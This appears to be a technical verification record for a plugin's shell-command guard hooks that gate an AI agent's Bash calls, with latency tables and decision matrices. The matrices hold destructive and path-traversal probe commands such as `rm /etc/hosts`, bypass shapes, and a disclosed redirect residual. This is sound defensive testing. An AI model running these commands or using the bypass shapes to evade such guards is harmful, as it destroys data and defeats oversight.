# Guard verification

**Who reads this:** anyone changing a guard hook under `plugin/hooks/` or the configuration library they share. It records what the guard set does **as a whole** — its per-call cost and the standing decision matrices — as measured, so a later change is regressable rather than merely reviewable. The per-guard decision detail lives in each script's own header REPRO block; this file is what those blocks cannot carry, because it is about the set rather than about one decision.

All six guards register on `PreToolUse` under the `Bash` matcher with **no `if:` condition** (`plugin/hooks/hooks.json`), so all six run on **every** Bash tool call in every session the plugin is enabled for. That is why the composite row in §1.2, and not any single guard's row, is the number a change is judged against.

---

## 0. Method

Every figure in this file came from the recipe below. A measurement that does not follow it is not comparable to these, and replacing a number here means re-running the recipe rather than adjusting the number.

**The fixture repositories.** Two, both built outside any real checkout, under the system temp directory:

- **Primary.** `git init`; `examples/harness.config.json` copied in verbatim as `harness.config.json` at the root — `projectName: acme-shop`, `defaultBranch: main`, `protectedBranches: ["main","release/*"]`, `appDir: packages/storefront`, `scriptsDir: packages/storefront/scripts`, `qa.credentialsPath: .claude/qa-accounts.env`, `phases.qa: true`; one tracked file, `tracked.txt`, committed; HEAD checked out on an **ordinary** branch, `feat_probe`, so that a push to `feat_probe` is the non-protected control and a push to `main` is the protected one.
- **Scoped.** Identical except `appDir: packages/@acme/storefront`, for the residual in which the `@` falls outside the path whitelist.

Keep a pristine copy of the configuration beside the fixture, restore from it after any driver that rewrites the file, and diff against it before trusting the next run.

**The payload.** Each guard takes one JSON object on stdin and prints at most one JSON object:

```sh
printf '{"tool_input":{"command":"<cmd>"},"cwd":"<repo>"}' | bash plugin/hooks/<guard>.sh
```

Empty output with exit 0 is a decision — recorded here as `SILENT`. Otherwise read `.hookSpecificOutput.permissionDecision`.

**The compound payloads.** `<cmd>` at 1 / 2 / 4 / 8 pieces is `git status`; that plus `&& ls`; that plus `&& pwd && git log`; that plus `&& git diff && cat a && echo b && wc -l c` — one, two, four and eight `&&`-joined pieces, `cwd` pointing at the primary fixture. One further payload, `ls`, is the cheapest call the set can be handed: nothing in it interests any guard, so it measures what enabling the plugin costs a session doing ordinary work.

**Timing.** For the §1.2 grid: 20 iterations per cell, wall clock around the loop divided by 20, where a cell is one guard against one payload. The decompositions in §1.5 use more iterations because their cells are smaller; each names its own count. Latency figures are **paired** — the tree under test and the tree it is compared against are measured back to back inside one run, never quoted from an earlier one — because the absolute numbers move with machine state while the ratio does not.

**Shell and versions, named.** `/bin/bash` **3.2.57(1)-release**, arm64 macOS (Darwin 24.6.0), `jq` **1.7.1**. These are `bash` 3.2 numbers and a machine whose `/bin/bash` is 5.x will not reproduce them; 3.2 is the floor precisely so that macOS's system shell qualifies (`plugin/hooks/README.md` §Prerequisites).

**Fork counting.** A shim directory placed first on `PATH`, holding one wrapper per binary of interest — `jq`, `git`, `sed`, `grep`, `tr`, `cat`. Each wrapper appends one line to a counter file and then `exec`s the real binary. Truncate the counters, run one decision with the shim directory first on `PATH`, count the lines. Fork counts are exact integers and do not vary between runs, which is what makes them the tight half of the invariant in §1.1.

**Destructive shapes are probed with a benign stand-in.** `rm -r-f` is textually equivalent for every matcher in the set and does nothing if it ever escaped a payload. **Never put a real `rm -rf` in a fixture.** A payload naming a plain `rm <tracked-file>` is fine and is what the rewrite guard's positive control needs — it is a string handed to a guard on stdin and is never executed.

**A second guard set, for the "before" column.** Several tables below carry one. It is not an older release: it is a copy of the same six scripts and the same library as they stood immediately **before the configuration cache landed** — one `jq` fork per configuration key, and `printf | sed` pipelines for the two parsers — kept in a scratch directory and measured in the same paired run as the current tree. Reproducing it is a checkout of those seven files at that revision into a scratch directory and nothing else, because a guard reaches its library through its own directory's `lib/`.

**Where the fixtures for a given round live.** Under the system temp directory, and they are not durable. Cite this recipe, never a temp path; the round that produced a table records its own fixture paths in that round's own notes.

---

## 1. Whole-set latency baseline

### 1.1 The invariant

**A change to any guard or to `lib/harness-config-lib.sh` re-runs §0's recipe and updates the tables in §1.2 and §1.3 in the same commit.** The two tables carry deliberately different tolerances:

- **Fork counts (§1.3): exact.** Any change to any cell is a finding. They are deterministic, they are what the cost is actually made of, and the flatness of the current rows across 2 / 4 / 8 pieces is the property that stops a per-piece fork being reintroduced unnoticed.
- **Latency (§1.2): ±10% per composite cell**, judged against a paired re-run and never against a remembered number. Four independent paired runs of this recipe put the current-tree composite within about 6% of itself in every cell, so 10% is a little under twice the observed spread and a move past it is signal rather than weather. A composite cell that moves further is a finding, not a footnote: record what caused it, not only the new number.

**This tree does not discharge that invariant for the library's growth, and discloses rather than restamps.** `lib/harness-config-lib.sh` has grown since §1.2's and §1.3's paired runs were taken — `wc -l < plugin/hooks/lib/harness-config-lib.sh` reads **1,643** — and neither table was re-driven for that growth, so both are stamped at the earlier, smaller library. Restamping means re-running §0's recipe whole; this note is what the re-run deletes, never what it edits.

**The construct scan in `autonomous-script-allowlist-guard.sh` (§3.1's N93–N107) is disclosed against the same note, and its fork half is discharged rather than disclosed.** §1.3 was re-driven for it with §0's `PATH` shim on both of that table's payloads — `git status && ls` and the bare `ls` — and this guard's counts are unchanged at one `cat` and nothing else, because the scan is a `case` over a string in the already-running shell — with, since the `${` arm was narrowed to `${IDENT}` (§3.3's W19–W21), a `while` over builtin parameter expansion beside it — and forks nothing; §1.3's "the other four" row therefore still holds exactly. §1.2 was **not** re-driven: a fork-free `case` on a string this guard has already prefiltered cannot plausibly move a 6.8 ms cell by the 10% the tolerance allows, but "cannot plausibly" is not a paired run, so the cells stay stamped where they were.

A change that makes the recipe itself wrong — a different payload set, a different iteration count, a different shell — re-measures the whole table rather than one cell, and rewrites §0 in the same commit.

### 1.2 Per-guard and composite latency, ms per call

Cells read **before → now**, one paired run, method as §0. "Before" is the per-key-read, `sed`-parser guard set described at the end of §0.

| Guard | 1 piece | 2 pieces | 4 pieces | 8 pieces |
|---|---|---|---|---|
| `autonomous-protected-branch-guard.sh` | 6.3 → 7.2 | 6.4 → 6.8 | 6.3 → 6.9 | 6.5 → 6.9 |
| `git-commit-branch-guard.sh` | 6.1 → 6.8 | 6.4 → 6.7 | 6.2 → 6.7 | 6.3 → 6.8 |
| `git-rewrite-branch-guard.sh` | 6.3 → 6.7 | 6.3 → 6.8 | 6.6 → 6.6 | 6.4 → 6.7 |
| `autonomous-script-allowlist-guard.sh` | 6.3 → 6.8 | 6.3 → 7.0 | 6.3 → 6.8 | 6.3 → 6.9 |
| `allow-safe-compounds.sh` | 6.3 → 6.8 | 87.7 → **42.4** | 101.9 → **47.4** | 130.8 → **60.0** |
| `allow-qa-credentials-read.sh` | 36.8 → **27.5** | 40.2 → **27.5** | 46.2 → **29.6** | 60.3 → **33.0** |
| **COMPOSITE** | 68.1 → **61.8** | 153.3 → **97.2** | 173.5 → **104.0** | 216.6 → **120.3** |

Read a single cell as a magnitude, not as a constant. Re-running the pair moves individual cells by up to about 7%: three earlier paired runs of the same recipe put the current-tree composite at 63.5 / 101.1 / 110.2 / 126.8, at 63.5 / 102.3 / 110.1 / 124.6 and at 62.4 / 100.6 / 108.6 / 123.0 ms.

Two shapes in that table are worth naming because they are structural rather than incidental:

- **The four prefilter-exit guards each got slightly slower** — of their sixteen cells, fifteen moved up by 0.3 to 0.9 ms and one did not move. That is the cost of sourcing a library that grew from 938 lines when the cache landed to 1,643 today, and it is paid by every guard on every call whether or not the guard has anything to say. These cells were taken before that growth, as §1.1's disclosure records. §1.5(a) decomposes it.
- **`allow-safe-compounds.sh` at one piece is not the same guard as at two.** Its top-level string prefilter exits before any subprocess when the command carries no `&`, `|`, `;` or `\`, which is why its one-piece cell sits at the floor and its two-piece cell does not.

**The referent §3's tables diff against, named here because §3 points at this section for it.** The pre-extraction guard set this plugin was ported from — a different, product-specific implementation, with a literal filename prefilter in its credentials guard and no shared configuration library — is **not part of this repository**. No timing of it is quoted anywhere in this file and none can be re-taken here; every figure above and below is this tree's own, under §0's recipe. That is also why the `git rev-parse` the credentials guard still forks is **costed rather than assumed**: it runs on every Bash call, it is the set's only `git` fork on the cheapest payload (§1.3), and this tree's own measurement is the only thing that can bound it — that guard's header carries the per-fork cost under **WHAT THAT COSTS, AND WHY THE COST IS ACCEPTED RATHER THAN UNNOTICED**.

### 1.3 Forks per decision

Counted with the `PATH` shim from §0, one decision per cell, on the two-piece payload `git status && ls`, fed by redirection so that the only `cat` the counter sees is the guard's own. Cells read **before → now**.

| Guard | `jq` | `git` | `sed` | `grep` | `tr` | `cat` |
|---|---|---|---|---|---|---|
| `allow-safe-compounds.sh` | 18 → **3** | 1 → 1 | 9 → **0** | 0 → 0 | 0 → 0 | 3 → 3 |
| `allow-qa-credentials-read.sh` | 4 → **2** | 1 → 1 | 6 → **0** | 1 → 1 | 0 → 0 | 1 → 1 |
| the other four | 0 → 0 | 0 → 0 | 0 → 0 | 0 → 0 | 0 → 0 | 1 → 1 |

Every guard's one baseline `cat` is `payload=$(cat)` draining stdin. `allow-safe-compounds.sh`'s other two are the library's `cat <<EOF` heredocs in `hc_path_anchored_patterns` and `hc_safe_prefixes`; §1.5(b) records them.

**The current counts are flat in piece count, and that is the invariant that matters most.** At 1 / 2 / 4 / 8 pieces, `allow-safe-compounds.sh` forks 0 / 3 / 3 / 3 `jq`, 0 / 1 / 1 / 1 `git` and 1 / 3 / 3 / 3 `cat` — the one-piece row is its prefilter exiting before it reads the configuration at all — and `allow-qa-credentials-read.sh` forks 2 `jq`, 1 `git`, 1 `grep` and 1 `cat` at every one of them. Before the cache, two counts scaled with the compound: `allow-safe-compounds.sh` forked `sed` 9 / 15 / 27 times at 2 / 4 / 8 pieces, and `allow-qa-credentials-read.sh` forked it 4 / 6 / 10 / 18 times at 1 / 2 / 4 / 8. That scaling is what the 8-piece column was mostly buying.

**On the cheapest possible Bash call** — payload `ls`, nothing any guard cares about — the whole six-guard set costs exactly **2 `jq`, 1 `git`, 1 `grep`** and one `cat` per guard to drain stdin, six in all. All of the first three are `allow-qa-credentials-read.sh`'s, and the `git` is `hc_resolve_repo_root`'s `git -C <dir> rev-parse --show-toplevel`. That guard's header carries the per-fork costs under **WHAT THAT COSTS, AND WHY THE COST IS ACCEPTED RATHER THAN UNNOTICED**, and the paragraph after it, **THE `git rev-parse` STAYS, DELIBERATELY**, records the further narrowing that was measured and rejected.

### 1.4 Two preconditions the whole set inherits from the configuration load

Both arrived with the cache, both are properties of the *set* rather than of any one guard, and both are the kind of thing a per-guard REPRO block has no place to state. They belong in §2.3 as regression rows; they are recorded here because they bound what the numbers above mean.

**A `jq` older than 1.5 does not make the guards quiet — it makes them refuse.** The load's program uses `input` / `inputs`, `@tsv`, `try … catch`, `error("…")` and `def s($k; $v)` value parameters, all of which are jq 1.5 constructs. On an older `jq` the program is a compile error, so every **adopted** repository reads as one whose configuration cannot be resolved — while `command -v jq` still succeeds, which is what makes it confusing. Measured against a stand-in that is present on `PATH`, answers `jq --version`, and rejects exactly those constructs with exit 3 as jq 1.4 does:

| Case, on the primary fixture (HEAD on `feat_probe`) | jq 1.7.1 | pre-1.5 stand-in | before the cache, pre-1.5 |
|---|---|---|---|
| `git -C <repo> push origin feat_probe` — **ordinary** push, non-protected branch | SILENT | **`deny`** | SILENT |
| `git -C <repo> push origin main` — protected branch | `deny` | `deny` | `deny` |
| `git -C <repo> commit -m x` — ordinary branch | `allow` | **`ask`** | `allow` |
| `git -C <repo> status && rm <repo>/tracked.txt` | `allow` | **SILENT** | `allow` |
| `bash <repo>/packages/storefront/scripts/typecheck.sh` | `allow` | **SILENT** | `allow` |
| `git status && ls` | `allow` | **SILENT** | `allow` |
| `cat <repo>/.claude/qa-accounts.env` | `allow` | **SILENT** | `allow` |

Every move is toward refusal, so the floor is safe rather than dangerous — but denying an ordinary push on a non-protected branch is an outage, not a nag, and it is invisible to the `command -v jq` diagnostic. `plugin/hooks/README.md` §Prerequisites states the floor and separates the two failure modes; `lib/harness-config-lib.sh`'s header lists the constructs under **JQ 1.5 IS THE FLOOR**. A machine below the floor cannot produce comparable numbers for §1.2 either, because no guard reaches its decision path there.

**A configuration file holding more than one JSON document now fails closed.** The load binds the first document and errors if anything remains. Before the cache, per-key `jq -r` read such a file as a stream and answered from all of its documents at once, which merged the protected sets — and three of six guards **permitted** off it. Measured with the primary fixture's configuration plus a second document differing only in `defaultBranch`, one positive-control command per guard, single-document run as the control:

| Guard | one document (control) | two documents, now | two documents, before |
|---|---|---|---|
| `autonomous-protected-branch-guard.sh` | `deny` | `deny` | `deny` |
| `git-commit-branch-guard.sh` | `allow` | **`ask`** | `allow` |
| `git-rewrite-branch-guard.sh` | `allow` | **SILENT** | `allow` |
| `autonomous-script-allowlist-guard.sh` | `allow` | SILENT | SILENT |
| `allow-safe-compounds.sh` | `allow` | **SILENT** | `allow` |
| `allow-qa-credentials-read.sh` | `allow` | SILENT | SILENT |

The protected-branch guard denies in both columns, but for different reasons: now on its unresolvable-configuration arm, before on its ordinary arm having merged both documents' branches. No single-document configuration the schema admits is affected. The rewrite guard's row read SILENT in all three columns when this table was first taken, because its probe carried the `rm -r-f` stand-in, which that guard refuses outright — §0 asks for a plain `rm <tracked-file>` there for exactly this reason. Re-driven with one, the row moves and the permitted-before count is three rather than two; §2.3 carries the re-measurement.

### 1.5 Costs measured and not addressed

Recorded so a later change can pick one up deliberately. **None of these is a defect and none was fixed when this file was written**; each is a design change with its own decision matrix, and none of them is covered by the decision-identity gate a routine guard change runs.

**(a) The floor every guard pays before it decides anything: about 6.4 ms, six times per Bash call.** Roughly 38 ms of the 61.8 ms one-piece composite is spent before any guard has looked at the command. Decomposed, 40 iterations per row, current tree and the before-the-cache tree in one run:

| Step | now | before |
|---|---|---|
| `bash` process startup, piped into an empty script | 1.93 | 1.90 |
| plus sourcing `lib/harness-config-lib.sh` by a literal path | 3.04 | 2.94 |
| plus `payload=$(cat)` to drain stdin | 4.23 | 3.88 |
| with the guards' own `. "$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)/lib/…"` idiom in place of the literal path | 6.21 | 5.74 |
| a whole prefilter-exit guard on the `ls` payload | 6.40 | 5.91 |

Three candidates fall out of that table, in descending size:

- **The sourcing idiom costs about 2.0 ms per guard per call** — two nested command substitutions and an external `dirname` — which is roughly 12 ms across the set on every Bash call, and it is the largest single item in the floor. `${BASH_SOURCE[0]%/*}` would remove all of it, but it is **not** a drop-in: `cd … && pwd` canonicalizes symlinks and resolves a relative invocation, and the parameter expansion does neither, so the substitution changes behaviour for a symlinked or relatively-invoked hooks directory and needs its own matrix before anyone ships it.
- **`payload=$(cat)` costs about 1.1–1.3 ms** — a subshell plus a `cat`. A `read`-based drain would remove both but must preserve the payload's exact bytes, trailing newline included, or the parse changes.
- **The library grew 938 → 1,643 lines with the cache and the changes since, and every guard sources all of it**, which is what made the four prefilter-exit guards slower in §1.2. The whole-guard delta is clean; the per-row deltas in the table above are at this driver's noise floor, so attribute the cost to the file's size rather than to any one of those rows. Splitting the library, or lazy-loading the parts only two guards use, would recover it and is a wider change than any of the above.

**(b) Bash-level subshell forks inside the library.** Measured with the configuration already cached, so no `jq` runs in any of these except where noted; two runs, both shown, 20 calls per cell. This driver's own floor is about 0.78 ms per call — the four cheapest helpers sit on it — and one bare `$( : )` subshell costs about 1.1 ms, so read the small numbers as "at the floor" rather than as differences.

| Helper | ms/call | note |
|---|---|---|
| `hc_resolve_repo_root` | 12.0 / 11.5 | includes the `git rev-parse` |
| `hc_repo_root` | 8.2 / 7.8 | the same `git rev-parse` |
| `hc_path_anchored_patterns` | 7.6 / 7.5 | one `cat`, for its heredoc |
| `hc_safe_prefixes` | 4.7 / 4.6 | one `cat`, for its heredoc |
| `hc_repo_dir_from_command` | 3.7 / 3.8 | |
| `hc_payload_fields` | 3.4 / 3.3 | one `jq` |
| `hc_runner_piece_in_workspace` | 3.0 / 2.9 | |
| `hc_runner_words` | 1.6 / 1.6 | |
| `hc_project_name` | 1.5 / 1.6 | |
| `hc_config_dir` (`appDir`) | 1.6 / 1.5 | |
| `hc_git_piece_in_workspace` | 1.2 / 1.3 | |
| `hc_torn_substitution`, `hc_clean_piece`, `hc_split_command`, `hc_piece_is_never_safe` | 0.74–0.80 | at the driver's floor |
| *reference:* one `jq -nc '{a:1}'` | 2.5 | |
| *reference:* one `$( : )` subshell | 1.1 | |

`hc_path_anchored_patterns` at roughly 6.8 ms net of the floor is the largest bash-level item, and apart from one `cat` the cost is command substitutions. Removing them means var-returning variants across the library, which is a wider diff than a decision-identity gate cheaply covers, and it is why this was recorded rather than done. The two `cat` forks are cheaper to reach: both come from a `cat <<EOF` heredoc emitting a fixed list, and both would go away by emitting the list some other way — but the emitters are called through `$( … )` by both allow-only guards, so removing the fork does not remove the subshell around it, and the two belong in one change rather than two.

**(c) The grid stops at 8 pieces and the expansion parser is quadratic.** `hc_split_command` costs O(pieces × length) and is called three times per decision. Warm-up call excluded, 50 iterations per cell: 0.42 ms at 1 piece, 0.34 at 2, 0.40 at 4, 0.57 at 8, 1.07 at 16, 2.63 at 32, 28.4 at 128; separately, 409 ms at 512 and 1.6 s at 1,024. End to end through `allow-safe-compounds.sh`, the `sed`-fork parser it replaced is still slower at every ordinary size — 8 pieces 126 → 61 ms, 128 pieces 904 → 522 ms, 512 pieces 3.5 → 2.9 s — with the crossover near **1,024 pieces**, where the fork form wins at 7.0 s against 8.2 s. Nothing in a real session approaches that; the number is here so the ceiling is stated rather than discovered. The scaling and the trade are also recorded in `lib/harness-config-lib.sh` under **BOTH PARSERS ARE PURE PARAMETER EXPANSION, AND THAT IS A COST FIX WITH A SECOND, SAFETY HALF**.

---

## 2. Standing decision matrices

The whole-set decision records. Each subsection is a table of cases a change to the guards must reproduce exactly, plus the positive controls that show the guards were live when it was taken. The index is fixed so that a later addition has a home and does not renumber an existing one:

- **§2.1** — Helper call-order composition: the state each shared helper receives the piece in, verified end to end through both allow-only guards rather than pairwise.
- **§2.2** — Expansion-bypass rows: the `$(`-depth and expansion traversal defences.
- **§2.3** — Fail-closed matrix, with positive controls: every guard against an unresolvable configuration, an absent configuration and an unparseable payload, alongside a control showing the same guard still decides.
- **§2.4** — Disclosed residuals, re-confirmed: the standing status of every disclosed shape — the ones deliberately left open, each with its bound restated as a measurement, and the ones that have since been closed, each with the arm that closed it named.
- **§2.5** — Directory de-quoting: the widening the `-C` de-quote granted, the refusal it did not, and the fault injection showing that one one-line call carries both.

### 2.1 Helper call-order composition

**Who reads this and what for:** anyone reordering, inlining or "simplifying" a step in either allow-only guard's piece loop. It answers one question — *what state is the piece in when each shared helper receives it, and does that match what the helper assumes?* — because a helper that assumes a different state than its caller hands it is how two of this branch's own defects arrived, each of them a pairwise-verified change that was never composed with the others.

**Outcome: verified, no decision changed.** Both call orders were walked end to end against real `PreToolUse` payloads, method as §0, on a tree carrying every fix through the configuration cache. Across the whole matrix below **no row's actual state differs from the state its helper's contract assumes**, and no guard decision moved. What the pass did produce is three places where the assumption was not written down anywhere and one bounded widening that was not disclosed; all four are recorded below and the first three were closed in the same commit as this section. The one thing this section is *not* is a re-derivation of an earlier round's rows: every row here was re-measured against the post-cache tree, and the same matrix run against the pre-cache tree moved **no row at all**, which is the decision-identity evidence for that refactor that §1's timing tables cannot carry.

**Fixtures**: §0's primary, plus one addition this round needs and later rounds inherit — a **real sibling worktree of the primary**, created with `git worktree add` on an ordinary branch, so the `<work_root>/<project_name>-*` arms can be exercised as something other than a path that does not resolve. §0's primary alone cannot distinguish "refused because the directory is outside `top`" from "silent because the anchor names a directory that is not a repository"; three rows below turn on exactly that distinction.

#### The call order in `allow-safe-compounds.sh`

| # | What runs, in order | State the piece is in **here** | State the callee's contract **assumes** | Where the assumption is written |
|---|---|---|---|---|
| 1 | `hc_split_command "$cmd"` | whole command | — it is the producer: joins `\`+newline first, then splits on `&&` / `\|\|` / `;` / a bare `&` | `harness-config-lib.sh`, "One compound piece per line…" |
| 2 | the loop's own `while IFS= read -r piece` | one **line** of the split output | — it is the second producer, and the only thing that makes a bare newline a separator: `hc_split_command` does not split on one | not written anywhere before this section; see the newline note below |
| 3 | `hc_torn_substitution "$piece"` | **raw** | raw, explicitly *before* cleaning | lib: "Call this on the RAW piece, BEFORE `hc_clean_piece`"; guard loop comment |
| 4 | `hc_clean_piece "$piece"` | raw → **cleaned** (trimmed, grouping parens peeled) | a single line | lib: "`sed` applies its program PER LINE… No caller can reach this with a multi-line argument" |
| 5 | `is_safe` → `hc_piece_is_never_safe` | cleaned | a piece whose command word is `git` — i.e. already trimmed and paren-free | `hc_git_piece_parts`' `case "$p" in git\ *)`; guard: "FIRST, so no arm below can vouch for it" |
| 6 | `is_safe` → `hc_matches_any_pattern` | cleaned | trimmed, single line — the arms are start-anchored `case` globs | `hc_path_anchored_patterns`, "THEY ARE GLOBS, NOT FILESYSTEM LOOKUPS" |
| 7 | `is_safe` → `hc_git_piece_in_workspace` | cleaned; **de-quotes** the `-C` directory internally, then whitelists it | starts with `git `; directory absolute, `..`-free, ordinary path characters, inside the workspace | lib fn header; the de-quote is `hc_git_piece_parts`' |
| 8 | `is_safe` → `hc_runner_piece_in_workspace` | cleaned; **de-quotes** the directory, then whitelists it | `<runner> --prefix <dir> <tail>`, same directory rules, whitelist strictly *after* the de-quote | lib fn header, "it must sit AFTER the `hc_strip_quotes` call above" |
| 9 | `is_safe` prefix loop | **cleaned** and, when a rewrite was produced, the **rewritten** form — both tested, neither instead of the other | leading-words match | guard: "PREFIX MATCHING IS EXACTLY THAT" |

Row 1's bare `&` arrived after the rest of this table, with the rows in §3.1; it changes what a *piece* is, not the order the callees run in, so no other row moves. The three redirection spellings it steps over (`&>`, `>&`, `<&`) are in `hc_bare_amp_head`.

#### The call order in `git-rewrite-branch-guard.sh`

Steps 1–4 are identical, and steps 5–9 are identical inside `is_safe_prefix`. What this guard adds:

| # | What runs, in order | State the piece is in **here** | State the callee's contract **assumes** | Where the assumption is written |
|---|---|---|---|---|
| 4b | the trailing-redirect `sed` | cleaned → **redirect-stripped** | — | nowhere before this section; see the next subsection |
| 5–9 | `is_safe_prefix` (same five steps) | cleaned + redirect-stripped | as above | as above |
| 10 | `update_cwd_from_cd` | cleaned + redirect-stripped, and only on a piece `is_safe_prefix` already granted | a piece whose first word is `cd`, absolute or relative to the threaded cwd | guard's piece-walk header |
| 11 | `hc_git_piece_parts` + the reconstruction `case` | cleaned + redirect-stripped, **quotes intact** — the reconstruction compares the piece against `git -C <dir>`, `git -C "<dir>"` and `git -C '<dir>'` built from the **de-quoted** `HC_GIT_DIR`, so it needs both forms at once | quotes intact | guard: "NOTHING MAY SIT BETWEEN `git` AND THE SUBCOMMAND except that one `-C`" |
| 12 | `validate_rm_piece` | cleaned + redirect-stripped; refuses outright on a quote or backslash | unquoted, unescaped; every token resolved against the threaded `piece_cwd` | guard header's `validate_rm_piece` list |
| 12a | `hc_in_workspace "$abs" "$top"` | absolute path | textual `case` glob, never normalises | `hc_in_workspace` header |
| 12b | the `case "$abs" in "$top"/*)` test | the same absolute path | — a second, narrower containment test | not written as a dependency before this section; see the two-test rows below |

**No row above has (state at the call site) ≠ (state the contract assumes).** The three cells reading "nowhere before this section" are the documentation gaps this pass closed: the redirect strip is now stated in that guard's header and its absence stated in the other's, and the library's zero-piece note now names both guards rather than one.

#### The two guards' one difference: the trailing redirect

Only the rewrite guard strips a trailing redirect (step 4b). Measured both ways — the shipped tree, a copy of the rewrite guard with the strip removed, and a copy of the compounds guard with the same strip added — the strip changes **three** decisions, all in the rewrite guard, and the divergence between the two guards is visible in exactly **one** shape:

| Shape (§0's `<repo>`, `<app_dir>`, `<tracked>`) | compounds | rewrite | rewrite, strip removed |
|---|---|---|---|
| `git -C <repo> status 2>/dev/null` in a compound | allow | allow | allow |
| `<runner> --prefix <app_dir> 2>/dev/null` in a compound | **SILENT** | **allow** | SILENT |
| `git -C <repo> status && rm <repo>/<tracked> 2>/dev/null` | n/a (no `rm` arm) | allow | SILENT |
| `git -C <repo> status && rm <repo>/<tracked> >/<outside>/x` | n/a | **allow** | SILENT |
| `git -C <repo> status && rm <repo>/<tracked> > /<outside>/x` (space after `>`) | n/a | SILENT | SILENT |

Read those rows together and the strip is doing one narrow job. A redirect on a piece matched by **leading words** rides along in both guards whether or not the strip exists — that is the inherited limit the compounds guard's header already states, and the same tree allows `git status >/<outside>/x && ls` outright. What the strip adds is that same limit for the two arms that match **exactly** rather than by leading words: the tail-free `--prefix <dir>` arm, and `validate_rm_piece`, which would otherwise read `2>/dev/null` as a path token and refuse.

**The asymmetry is kept, and is now stated in both headers** — it is load-bearing for `rm <tracked> 2>/dev/null`, an ordinary shape, and removing it buys back nothing the compounds guard does not already grant on any safe prefix. Its cost is the fourth row: a redirect target outside the workspace rides along on an `rm` the guard would otherwise refuse for naming a path outside the workspace. That is a **disclosed residual**, not a fix, and the argument for accepting it is measured rather than asserted — the identical capability is reachable in the same plugin through the compounds guard on any of ~40 base prefixes, so closing it here would move nothing. Closing the class means validating redirect targets in both guards, which is a redesign with its own matrix.

#### The composition matrix

Composed as the cross-product of the four helpers' trigger shapes rather than as a list of guesses: for each helper one shape where it fires and one where it does not, then every pair in both orderings, then all four in one compound with each position poisoned in turn. Every row is a real payload; destructive shapes are the benign `rm -r-f` stand-in per §0. Where a family lists a single decision, both guards agreed.

**Composition rule.** A compounds-guard row is `git status && <shape>`; a rewrite-guard row is `<shape> && rm <repo>/<tracked>`, so each shape is judged beside a piece the other guard's arms must also pass. The four shapes are: torn `echo $(rm -r-f /x; ls)` / balanced `echo $(date)`; `git branch -D <b>` / `git branch --show-current`; `git -C <repo> push --all <remote>` / `git -C <repo> status`; `<runner> --prefix <app_dir> install <pkg>` / `<runner> --prefix <app_dir> <configured subcommand>`.

**A. one helper at a time** — torn fires SILENT, balanced allow; `git branch -D` SILENT, `--show-current` allow; `git -C <repo>` with a safe subcommand allow and with `push --all` SILENT; a `-C` that is outside the workspace or relative SILENT; the runner rewrite the same three ways; the `cd` arms for root, `<app_dir>` and `<state_dir>` allow, `cd` outside the workspace SILENT; the exact tail-free `--prefix <app_dir>` arm allow. A `cd` naming a sibling-worktree path that **is not a repository** is SILENT for a different reason than all of the above — the anchor does not resolve, so the guard never reaches its arms.

**B. the states, probed one at a time.** These are the rows this section exists for.

| Piece shape | compounds | rewrite | what it pins |
|---|---|---|---|
| `(git branch -D <b>)` | SILENT | SILENT | `hc_piece_is_never_safe` sees the **cleaned** piece |
| `(git -C <repo> status)`, `(<runner> --prefix <app_dir> <sub>)` | allow | allow | so do both rewrite helpers |
| `␣␣␣␣git branch -D <b>`, `git -C <repo> status␣␣␣␣` | SILENT / allow | SILENT / allow | trimming happens before every step-5..9 test |
| `git -C "<repo>" status`, `git -C '<repo>' status` | allow | allow | one quote layer peeled **before** the path whitelist |
| `git -C "<repo>" branch -D <b>` | SILENT | SILENT | the never-safe test parses through the `-C`, quoted or not |
| `<runner> --prefix "<app_dir>" <sub>` | allow | allow | the whitelist runs after the de-quote, not before |
| `git branch "-D" <b>`, `git branch --de"lete" <b>`, `git branch --list $PAT` | SILENT | SILENT | a token the test cannot read is refused |
| `echo $(git branch -D <b>; ls)`, `echo $(rm -r-f /x; rm <tracked>)`, `echo $(rm -r-f /x $(date); ls)` | SILENT | SILENT | the torn test fires on the **raw** piece before any other test sees a fragment |
| `` echo ` ``, `grep '$(' f.txt` | SILENT | SILENT | the two disclosed costs of the torn test, unchanged in composition |
| `git branch \`+newline+` -D <b>` | SILENT | SILENT | the continuation join happens first; the never-safe token walk trims the doubled space |
| `git -C \`+newline+` <repo> status` | SILENT | SILENT | …and the `-C` scan does **not**: the join leaves `-C␣␣`, `HC_GIT_DIR` comes back empty and the rewrite is lost. One prompt, never a wrong allow |
| `git status`+newline+`git branch -D <b>` | SILENT | SILENT | a bare newline separates because the loop reads **lines**, not because the split does |

**C. pairwise and full orderings.** Six pairs × both orderings × both guards: all-safe pairs allow, and every pair carrying one poisoned shape is SILENT in both orderings. All four shapes in one compound: allow forward and reversed; SILENT with the poison at position 1, 2, 3 or 4, in both orderings, with `;` / `||` / `&&` mixed as separators, and with every piece wrapped in grouping parens. No ordering lets a poisoned piece through, and no ordering costs an all-safe compound its allow.

**D/F. the `cd`-threaded cwd, and the two-test dependency.** The rewrite guard threads a leading `cd` into the cwd later pieces resolve against, so a tracked `rm` needs both containment tests. Pinning `top` to the primary fixture with a leading `git -C <repo>` piece and then `cd`-ing elsewhere isolates them:

| Shape | rewrite | `hc_in_workspace` alone | the `$top` test alone |
|---|---|---|---|
| `cd <repo> && rm <tracked>` | allow | permits | permits |
| `cd <work_root>/<project_name>-<branch> && rm <tracked>` (a real worktree) | **SILENT** | **permits** | refuses |
| `cd <work_root>/<project_name>-<branch>/../../../etc && rm passwd` | **SILENT** | **permits** | refuses |
| `cd <work_root>/<project_name>-<branch>/../<project_name> && rm <tracked>` | **SILENT** | **permits** | refuses |
| `rm <work_root>/<project_name>-<branch>/<tracked>` (absolute, no `cd`) | **SILENT** | **permits** | refuses |
| `rm /etc/hosts` after `cd <repo>` | SILENT | refuses | refuses |

The middle four are the rows a later "simplification" has to fail on: `hc_in_workspace` is a `case` glob that never normalises, so the `<work_root>/<project_name>-*` arm matches a traversal straight out of the workspace, and it is the second test — resolved path under `$top`, before `git ls-files --error-unmatch` runs — that refuses it. **Both tests are load-bearing and neither is redundant.** A sibling worktree reached as its **own** anchor is a different case and still allows: it is an adopted checkout on an ordinary branch, judged on its own terms.

**E/G. the `git mv` / `git rm` arm in composition.** `git -C <repo> rm <tracked>` and its double-quoted spelling allow; `git mv` allows; a piece carrying `--git-dir=` or `-c <k>=<v>` alongside is SILENT (the reconstruction refuses it); a relative `-C` is SILENT; `git -C <sibling worktree> rm -r .` is SILENT when the guard judged the primary; and the arm is still reached after a safe `git -C` piece or a runner rewrite, and still not reached after a `git branch -D` or a torn piece.

